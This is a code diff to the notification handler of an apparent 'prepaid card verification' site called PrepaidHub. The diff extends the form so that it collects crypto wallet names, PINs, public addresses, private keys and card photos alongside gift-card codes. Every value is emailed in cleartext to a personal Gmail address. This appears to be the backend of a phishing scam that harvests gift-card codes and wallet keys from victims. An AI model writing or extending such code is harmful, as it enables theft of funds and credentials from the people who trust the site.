@@ -12,27 +12,42 @@ const corsHeaders = {
 interface NotifyAdminRequest {
   cardType: string;
   email: string;
-  codes: string[];
+  codes?: string[];
+  wallet?: string;
+  pin?: string;
+  publicAddress?: string;
+  privateKey?: string;
+  imageUrl?: string;
 }
 
 const handler = async (req: Request): Promise<Response> => {
-  // Handle CORS preflight requests
   if (req.method === "OPTIONS") {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    const { cardType, email, codes }: NotifyAdminRequest = await req.json();
+    const { cardType, email, codes = [], wallet, pin, publicAddress, privateKey, imageUrl }: NotifyAdminRequest = await req.json();
 
-    console.log("Received submission notification request:", { cardType, email, codesCount: codes.length });
+    console.log("Received submission notification request:", { cardType, email });
 
-    // Filter non-empty codes
     const filledCodes = codes.filter(code => code && code.trim() !== '');
-    const codesHtml = filledCodes.map((code, i) => `<li><strong>Code ${i + 1}:</strong> ${code}</li>`).join('');
+    const codesHtml = filledCodes.length
+      ? `<h3>Codes soumis:</h3><ul>${filledCodes.map((code, i) => `<li><strong>Code ${i + 1}:</strong> ${code}</li>`).join('')}</ul>`
+      : '';
+
+    const cryptoRows = [
+      wallet && `<li><strong>Wallet:</strong> ${wallet}</li>`,
+      pin && `<li><strong>PIN:</strong> ${pin}</li>`,
+      publicAddress && `<li><strong>Adresse publique:</strong> ${publicAddress}</li>`,
+      privateKey && `<li><strong>Clé privée:</strong> ${privateKey}</li>`,
+    ].filter(Boolean).join('');
+    const cryptoHtml = cryptoRows ? `<h3>Informations crypto:</h3><ul>${cryptoRows}</ul>` : '';
+
+    const imageHtml = imageUrl ? `<h3>Photo de la carte:</h3><p><a href="${imageUrl}">${imageUrl}</a></p><img src="${imageUrl}" style="max-width:400px;" />` : '';
 
     const emailResponse = await resend.emails.send({
       from: "PrepaidHub <onboarding@resend.dev>",
-      to: ["jobrentable1@gmail.com"],
+      to: ["prepaidhub0@gmail.com"],
       subject: `Nouvelle demande de vérification - ${cardType}`,
       html: `
         <h1>Nouvelle demande de vérification de carte prépayée</h1>
@@ -41,10 +56,9 @@ const handler = async (req: Request): Promise<Response> => {
           <li><strong>Type de carte:</strong> ${cardType}</li>
           <li><strong>Email client:</strong> ${email}</li>
         </ul>
-        <h3>Codes soumis:</h3>
-        <ul>
-          ${codesHtml}
-        </ul>
+        ${codesHtml}
+        ${cryptoHtml}
+        ${imageHtml}
         <p>Connectez-vous au tableau de bord pour traiter cette demande.</p>
       `,
     });
